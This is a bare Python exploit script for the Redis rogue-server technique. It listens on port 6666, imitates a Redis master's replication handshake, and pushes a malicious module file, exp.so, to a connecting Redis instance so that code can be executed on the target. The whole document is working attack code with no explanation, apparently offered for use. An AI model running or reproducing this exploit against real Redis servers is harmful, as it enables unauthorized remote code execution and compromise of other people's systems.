#!/usr/local/bin python
#coding=utf8
import socket
import time

CRLF="\r\n"
payload=open("exp.so","rb").read()
exp_filename="exp.so"

def redis_format(arr):
    global CRLF
    global payload
    redis_arr=arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len(x))+CRLF+x
    cmd+=CRLF
    return cmd

def redis_connect(rhost,rport):
    sock=socket.socket()
    sock.connect((rhost,rport))
    return sock

def send(sock,cmd):
    sock.send(redis_format(cmd))
    print(sock.recv(1024).decode("utf-8"))

def RogueServer(lport):
    global CRLF
    global payload
    flag=True
    result=""
    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("0.0.0.0",lport))
    sock.listen(10)
    clientSock, address = sock.accept()
    
    print("\033[92m[+]\033[0m Accepted connection from {}:{}".format(address[0], address[1]))
    
    while flag:
        data = clientSock.recv(1024)
        if "PING" in data:
            result="+PONG"+CRLF
            clientSock.send(result)
            flag=True
        elif "REPLCONF" in data:
            result="+OK"+CRLF
            clientSock.send(result)
            flag=True
        elif "PSYNC" in data or "SYNC" in data:
            result = "+FULLRESYNC " + "a" * 40 + " 1" + CRLF
            result += "$" + str(len(payload)) + CRLF
            result = result.encode()
            result += payload
            result += CRLF
            clientSock.send(result)
            print("\033[92m[+]\033[0m FULLRESYNC ...")
            flag=False
            
    print("\033[92m[+]\033[0m It's done")
    
if __name__=="__main__":

    lport=6666
    RogueServer(lport)
